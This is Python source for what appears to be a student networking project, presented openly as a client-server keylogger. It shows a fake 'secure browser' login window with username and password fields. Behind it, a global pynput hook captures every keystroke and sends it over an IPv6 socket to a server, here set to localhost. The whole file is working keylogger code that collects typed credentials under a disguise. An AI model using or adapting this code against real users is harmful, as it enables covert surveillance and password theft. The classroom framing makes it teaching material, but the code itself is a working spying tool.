"""
-----------------------------------------------------------------------
PROJETO DE REDES - CLIENTE (FRONTEND)
Tema: Keylogger Cliente-Servidor com IPv6
Grupo: 6
Descrição: Simula navegador, captura teclas (Hook) e envia via Socket IPv6.
-----------------------------------------------------------------------
"""

import socket
import threading
import tkinter as tk
from pynput import keyboard

# Configurações de Rede (IPv6)
HOST = '::1'
PORT = 50007

class ClientApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Navegador Seguro (Cliente)")
        self.root.geometry("500x300")
        
        # Interface Simples (Frontend)
        tk.Label(root, text="Navegador Teste - Área de Login", font=("Arial", 16)).pack(pady=20)
        
        tk.Label(root, text="Usuário:").pack()
        self.entry_user = tk.Entry(root, width=30)
        self.entry_user.pack(pady=5)
        
        tk.Label(root, text="Senha:").pack()
        self.entry_pass = tk.Entry(root, width=30, show="*")
        self.entry_pass.pack(pady=5)
        
        self.status_label = tk.Label(root, text="Status: Desconectado", fg="red")
        self.status_label.pack(pady=20)

        # Conexão Socket
        self.sock = None
        self.connect_to_server()

        # Inicia o Keylogger
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def connect_to_server(self):
        try:
            self.sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            self.sock.connect((HOST, PORT))
            self.status_label.config(text="Status: Conectado ao Servidor (Monitorado)", fg="green")
        except Exception as e:
            self.status_label.config(text=f"Erro de conexão: {e}", fg="red")

    def on_press(self, key):
        if self.sock:
            try:
                # Formata a tecla para envio
                k = str(key).replace("'", "")
                if key == keyboard.Key.space:
                    k = " [SPACE] "
                elif key == keyboard.Key.enter:
                    k = " [ENTER]\n"
                elif key == keyboard.Key.backspace:
                    k = " [BACK] "
                
                # Envia via Socket
                self.sock.sendall(k.encode('utf-8'))
            except Exception as e:
                print(f"Erro ao enviar: {e}")

if __name__ == "__main__":
    root = tk.Tk()
    app = ClientApp(root)
    root.mainloop()
    